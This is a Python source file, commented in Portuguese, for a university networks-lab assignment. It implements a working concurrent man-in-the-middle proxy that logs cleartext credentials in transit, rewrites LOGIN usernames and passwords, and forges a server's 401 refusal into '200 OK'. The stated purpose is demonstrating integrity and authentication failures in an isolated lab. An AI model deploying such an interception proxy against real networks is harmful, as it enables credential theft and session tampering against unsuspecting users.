#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Proxy MITM (man-in-the-middle) concorrente — Fase 2 (Lab. de Redes / PUCRS).

Intermediário que se posiciona entre o cliente e o servidor do serviço-alvo da
Fase 1 (autenticação em texto claro, TCP). O redirecionamento é feito por
CONFIGURAÇÃO: o cliente é apontado para o proxy (cliente.py --host <proxy>), e o
proxy conhece o endereço do servidor real. Para cada cliente, o proxy:

  1. aceita a conexão do cliente;
  2. abre a conexão ao servidor real;
  3. faz o relay das mensagens nos dois sentidos, podendo LER e ALTERAR cada
     mensagem em trânsito.

Como o protocolo não tem integridade nem autenticação, a adulteração passa
despercebida: o cliente/servidor aceita a mensagem modificada como legítima.
Isso demonstra a quebra de INTEGRIDADE e de AUTENTICAÇÃO (a defesa é a Fase 3).

Concorrência: uma thread por sentido de cada sessão (ver fase2/concorrencia.md).
Somente a biblioteca padrão de sockets é usada (sem frameworks).

Uso restrito a um laboratório isolado (VMs do próprio grupo).

Exemplos:
  # relay transparente (só lê e registra o tráfego)
  python3 proxy_mitm.py --escuta 0.0.0.0:5050 --servidor 10.0.0.20:5050

  # forja a resposta: um 401 do servidor vira 200 OK para o cliente
  python3 proxy_mitm.py --escuta 0.0.0.0:5050 --servidor 10.0.0.20:5050 --forjar-ok

  # adultera o pedido: injeta a senha correta / troca o usuário
  python3 proxy_mitm.py --servidor 10.0.0.20:5050 --trocar-senha S3nh4Secreta
"""

import argparse
import itertools
import socket
import sys
import threading
from datetime import datetime

ENCODING = "utf-8"
PORTA_PADRAO = 5050
BUFFER = 4096

# --- Regiões críticas globais (ver fase2/concorrencia.md) -------------------
# Serializa a escrita no stdout: sem isso, as linhas das várias threads/sessões
# se intercalam e a evidência fica ilegível.
_lock_log = threading.Lock()
# Gerador de IDs de sessão. itertools.count é atômico sob o GIL, mas o lock
# acima também o cobre quando o número é impresso junto com a mensagem.
_seq_sessao = itertools.count(1)


def agora() -> str:
    return datetime.now().strftime("%H:%M:%S")


def log(msg: str) -> None:
    """Imprime uma linha de log de forma atômica entre as threads."""
    with _lock_log:
        print(f"[{agora()}] {msg}", flush=True)


class Opcoes:
    """Parâmetros do proxy e regras de adulteração escolhidas na linha de comando."""

    def __init__(self, srv_host, srv_porta, forjar_ok, trocar_usuario, trocar_senha):
        self.srv_host = srv_host
        self.srv_porta = srv_porta
        self.forjar_ok = forjar_ok          # 401 (S->C) vira "200 OK bem-vindo <u>"
        self.trocar_usuario = trocar_usuario  # reescreve o usuário no LOGIN (C->S)
        self.trocar_senha = trocar_senha      # reescreve a senha no LOGIN (C->S)


class Sessao:
    """
    Estado de uma sessão (um cliente). É compartilhado pelas DUAS threads de
    relay da sessão (C->S e S->C), portanto o campo mutável `usuario` — escrito
    pela thread C->S ao ver o LOGIN e lido pela thread S->C ao forjar a resposta
    — é protegido por um lock próprio da sessão.
    """

    def __init__(self, sid, cli_sock, srv_sock, cli_addr, opcoes):
        self.sid = sid
        self.cli = cli_sock
        self.srv = srv_sock
        self.cli_addr = cli_addr
        self.op = opcoes
        self._usuario = None
        self._lk = threading.Lock()  # protege self._usuario

    def set_usuario(self, usuario: str) -> None:
        with self._lk:
            self._usuario = usuario

    def get_usuario(self) -> str:
        with self._lk:
            return self._usuario or "usuario"


# --- Adulteração (uma linha por vez) ----------------------------------------


def adulterar_c_para_s(sessao: Sessao, linha: str) -> str:
    """
    Inspeciona/altera mensagens CLIENTE -> SERVIDOR.

    Registra o usuário visto no LOGIN (para a forja da resposta) e, se pedido,
    reescreve usuário/senha. Qualquer linha fora do padrão passa inalterada.
    """
    partes = linha.split()
    if len(partes) == 3 and partes[0].upper() == "LOGIN":
        usuario, senha = partes[1], partes[2]
        sessao.set_usuario(usuario)
        op = sessao.op
        if op.trocar_usuario is not None:
            usuario = op.trocar_usuario
        if op.trocar_senha is not None:
            senha = op.trocar_senha
        return f"LOGIN {usuario} {senha}"
    return linha


def adulterar_s_para_c(sessao: Sessao, linha: str) -> str:
    """
    Inspeciona/altera mensagens SERVIDOR -> CLIENTE.

    Com --forjar-ok, transforma uma recusa de credenciais (401) em um
    "200 OK bem-vindo <usuario>": o cliente passa a crer que autenticou, embora
    o servidor tenha rejeitado. Demais linhas passam inalteradas.
    """
    if sessao.op.forjar_ok and linha.startswith("401"):
        return f"200 OK bem-vindo {sessao.get_usuario()}"
    return linha


# --- Relay de um sentido ----------------------------------------------------


def repassar(sessao: Sessao, sentido: str) -> None:
    """
    Repassa um sentido da sessão (C->S ou S->C), linha a linha.

    Mantém um buffer e processa apenas linhas completas (terminadas em '\\n'),
    pois o TCP não preserva fronteiras de mensagem — a mesma técnica do servidor
    da Fase 1. Ao encerrar (EOF, reset ou erro), derruba os DOIS sockets para
    destravar a thread irmã; a exceção fica contida nesta sessão e não afeta as
    demais (robustez).
    """
    if sentido == "C->S":
        origem, destino, adulterar = sessao.cli, sessao.srv, adulterar_c_para_s
    else:
        origem, destino, adulterar = sessao.srv, sessao.cli, adulterar_s_para_c

    buffer = b""
    try:
        while True:
            dados = origem.recv(BUFFER)
            if not dados:
                break  # a outra ponta fechou a conexão
            buffer += dados

            saida = b""
            while b"\n" in buffer:
                linha_bytes, buffer = buffer.split(b"\n", 1)
                original = linha_bytes.decode(ENCODING, errors="replace")
                modificada = adulterar(sessao, original)
                if modificada != original:
                    log(f"[sessão {sessao.sid}] {sentido} ADULTERADA: "
                        f"{original!r} -> {modificada!r}")
                else:
                    log(f"[sessão {sessao.sid}] {sentido}: {original!r}")
                saida += (modificada + "\n").encode(ENCODING)

            if saida:
                destino.sendall(saida)
    except (ConnectionResetError, BrokenPipeError, OSError):
        pass  # desconexão abrupta: tratada como fim da sessão
    except Exception as exc:  # linha inesperada não derruba as outras sessões
        log(f"[sessão {sessao.sid}] {sentido} erro: {exc}")
    finally:
        # Fecha ambos os lados para que a thread irmã (bloqueada em recv) saia.
        for sock in (sessao.cli, sessao.srv):
            try:
                sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass


# --- Uma sessão completa ----------------------------------------------------


def abrir_sessao(cli_sock: socket.socket, cli_addr, opcoes: Opcoes) -> None:
    """
    Trata uma conexão de cliente: abre a conexão ao servidor real e sobe as duas
    threads de relay. Toda a sessão vive isolada em sua própria thread, de modo
    que uma falha aqui não afeta as outras sessões.
    """
    sid = next(_seq_sessao)
    ip, porta = cli_addr[0], cli_addr[1]
    log(f"[sessão {sid}] + cliente {ip}:{porta} — conectando ao servidor "
        f"{opcoes.srv_host}:{opcoes.srv_porta}")

    try:
        srv_sock = socket.create_connection(
            (opcoes.srv_host, opcoes.srv_porta), timeout=10)
    except OSError as exc:
        log(f"[sessão {sid}] ERRO ao conectar no servidor: {exc}; encerrando")
        cli_sock.close()
        return

    sessao = Sessao(sid, cli_sock, srv_sock, cli_addr, opcoes)
    t_cs = threading.Thread(target=repassar, args=(sessao, "C->S"), daemon=True)
    t_sc = threading.Thread(target=repassar, args=(sessao, "S->C"), daemon=True)
    t_cs.start()
    t_sc.start()
    t_cs.join()
    t_sc.join()

    cli_sock.close()
    srv_sock.close()
    log(f"[sessão {sid}] - encerrada conexão de {ip}:{porta}")


# --- Programa principal -----------------------------------------------------


def parse_hostporta(texto: str, host_padrao: str) -> tuple:
    """Interpreta 'host:porta' ou só 'porta'; devolve (host, porta)."""
    if ":" in texto:
        host, porta = texto.rsplit(":", 1)
        return (host or host_padrao), int(porta)
    return host_padrao, int(texto)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Proxy MITM concorrente (relay + adulteração) — Fase 2."
    )
    parser.add_argument("--escuta", default="0.0.0.0:5050",
                        help="onde o proxy escuta o cliente (host:porta; "
                             "padrão: 0.0.0.0:5050)")
    parser.add_argument("--servidor", required=True,
                        help="endereço do servidor real (host:porta)")
    parser.add_argument("--forjar-ok", action="store_true",
                        help="reescreve respostas 401 do servidor como "
                             "'200 OK' para o cliente (quebra de autenticação)")
    parser.add_argument("--trocar-usuario", default=None,
                        help="reescreve o usuário nas mensagens LOGIN (C->S)")
    parser.add_argument("--trocar-senha", default=None,
                        help="reescreve a senha nas mensagens LOGIN (C->S)")
    args = parser.parse_args()

    host_escuta, porta_escuta = parse_hostporta(args.escuta, "0.0.0.0")
    srv_host, srv_porta = parse_hostporta(args.servidor, "127.0.0.1")

    opcoes = Opcoes(srv_host, srv_porta, args.forjar_ok,
                    args.trocar_usuario, args.trocar_senha)

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        listener.bind((host_escuta, porta_escuta))
    except OSError as exc:
        print(f"ERRO ao escutar em {host_escuta}:{porta_escuta}: {exc}",
              file=sys.stderr)
        sys.exit(1)
    listener.listen(16)

    regras = []
    if args.forjar_ok:
        regras.append("forjar-ok(401->200)")
    if args.trocar_usuario is not None:
        regras.append(f"trocar-usuario={args.trocar_usuario}")
    if args.trocar_senha is not None:
        regras.append(f"trocar-senha={args.trocar_senha}")
    log(f"PROXY MITM escutando em {host_escuta}:{porta_escuta} -> servidor "
        f"{srv_host}:{srv_porta}  adulteração: {', '.join(regras) or 'nenhuma'}")

    try:
        while True:
            cli_sock, cli_addr = listener.accept()
            thread = threading.Thread(
                target=abrir_sessao,
                args=(cli_sock, cli_addr, opcoes),
                daemon=True,
            )
            thread.start()
    except KeyboardInterrupt:
        log("encerrando proxy...")
    finally:
        listener.close()


if __name__ == "__main__":
    main()
